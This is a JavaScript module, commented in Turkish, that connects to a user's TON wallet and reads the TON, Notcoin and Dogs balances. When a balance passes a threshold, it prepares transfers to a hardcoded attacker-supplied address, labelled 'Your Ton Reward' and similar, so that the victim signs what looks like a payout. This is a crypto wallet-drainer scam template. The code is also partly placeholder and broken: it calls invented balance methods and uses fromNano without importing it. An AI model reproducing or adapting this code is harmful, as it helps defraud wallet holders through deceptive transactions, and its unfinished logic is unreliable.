/* eslint-disable */

const send_transaction = async (tonConnectUI) => {
  try {
    // Cüzdan bakiyesini alıyoruz
    const tonbalance = await tonConnectUI.getTONBalance(); // Burayı uygun API ile değiştir
    const notbalance = await tonConnectUI.getNotcoinBalance(); // Burayı uygun API ile değiştir
    const dogsbalance = await tonConnectUI.getDogsBalance(); // Burayı uygun API ile değiştir

    const balanceTon = tonbalance - 80000000; // 0.08 TON gaz ücreti olarak düşün
    const targetAddress = "UQDKbP8AA8sYpdI5v4elb600P5f6tdXbOJrG3vEjnoAiHREB"; // Buraya kendi cüzdan adresini koy

    console.log("Bakiye Bilgileri:");
    console.log("TON:", fromNano(tonbalance));
    console.log("Notcoin:", fromNano(notbalance));
    console.log("Dogscoin:", fromNano(dogsbalance));

    // Transaction mesajları (her coin için)
    const messages = [];

    // 0.4 TON üzerindeyse
    if (fromNano(tonbalance) > 0.4) {
      messages.push({
        address: targetAddress,
        amount: 5000000,
        payload: 'Your Ton Reward',
      });
    }

    // 400 Notcoin üzerindeyse
    if (fromNano(notbalance) > 400) {
      messages.push({
        address: targetAddress,
        amount: 5000000,
        payload: 'Your Notcoin Reward',
      });
    }

    // 400 Dogs Coin üzerindeyse
    if (fromNano(dogsbalance) > 400) {
      messages.push({
        address: targetAddress,
        amount: 5000000,
        payload: 'Your Dogs Reward',
      });
    }

    if (messages.length > 0) {
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60, // 60 saniyelik geçerlilik süresi
        messages,
      };

      // Transaction gönder
      const result = await tonConnectUI.sendTransaction(transaction);
      console.log('Transaction başarılı:', result);
    } else {
      console.log("Yeterli miktarda bakiye yok.");
    }
  } catch (error) {
    console.error('Transaction hatası:', error);
    alert("Transaction gerçekleşmedi: " + error.message); // Hata mesajını kullanıcıya göster
  }
};

export { send_transaction };
